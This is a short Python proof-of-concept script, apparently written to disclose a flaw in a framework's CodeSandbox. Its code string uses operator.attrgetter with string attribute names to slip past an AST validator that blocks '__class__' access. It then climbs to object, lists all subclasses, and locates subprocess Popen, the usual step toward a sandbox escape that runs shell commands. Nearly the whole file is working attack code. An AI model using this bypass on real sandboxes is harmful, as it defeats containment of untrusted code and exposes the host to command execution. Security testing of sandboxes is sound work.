from framework.graph.code_sandbox import CodeSandbox

sandbox = CodeSandbox()

# PoC: Use operator.attrgetter to access __class__ and bypass AST check
# The validator prohibits "obj.__class__" (ast.Attribute with attr="__class__")
# But it allows "operator.attrgetter('__class__')(obj)" because the string is just a string.

code = """
import operator
import sys

# 1. Get object class via attrgetter (bypasses validator)
get_class = operator.attrgetter("__class__")
obj_class = get_class(1)  # <class 'int'>

# 2. Get base (object)
get_base = operator.attrgetter("__base__")
base = get_base(obj_class) # <class 'object'>

# 3. Get subclasses method
get_subclasses = operator.attrgetter("__subclasses__")
subclasses_method = get_subclasses(base)

# 4. Call subclasses to find all classes
all_classes = subclasses_method()

# 5. Search for Popen (subprocess)
popen_class = None
for cls in all_classes:
    if cls.__name__ == "Popen":
        popen_class = cls
        break

result = "Popen found: " + str(popen_class)
"""

try:
    res = sandbox.execute(code)
    print(f"Success: {res.success}")
    print(f"Result: {res.result}")
    print(f"Variables: {res.variables.get('result')}")
    print(f"Error: {res.error}")
except Exception as e:
    print(f"Execution Error: {e}")
